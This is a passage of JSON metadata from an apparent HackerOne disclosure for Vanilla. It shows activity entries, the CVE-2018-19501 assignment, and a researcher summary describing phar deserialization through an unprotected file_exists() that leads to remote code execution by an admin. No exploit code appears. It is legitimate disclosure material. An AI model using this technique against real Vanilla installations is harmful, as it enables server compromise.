case?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-10-24T15:45:27.079Z","updated_at":"2018-10-24T15:45:27.079Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3527246,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-24T15:45:40.604Z","updated_at":"2018-10-24T15:45:40.604Z","first_to_agree":true,"actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3701308,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-23T15:45:43.156Z","updated_at":"2018-11-23T15:45:43.156Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3710729,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"CVE-2018-19501","markdown_message":"\u003cp\u003eCVE-2018-19501\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-26T17:43:27.708Z","updated_at":"2018-11-26T17:43:27.708Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":10546,"category":"researcher","content":"An authenticated admin user can inject an serialized payload into a phar archive and trigger a read access to it via an unprotected file_exists(). An attacker can leverage this to deserialize untrusted data and gain remote code execution.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eAn authenticated admin user can inject an serialized payload into a phar archive and trigger a read access to it via an unprotected file_exists(). An attacker can leverage this to deserialize untrusted data and gain remote code execution.\u003c/p\u003e\n"}]}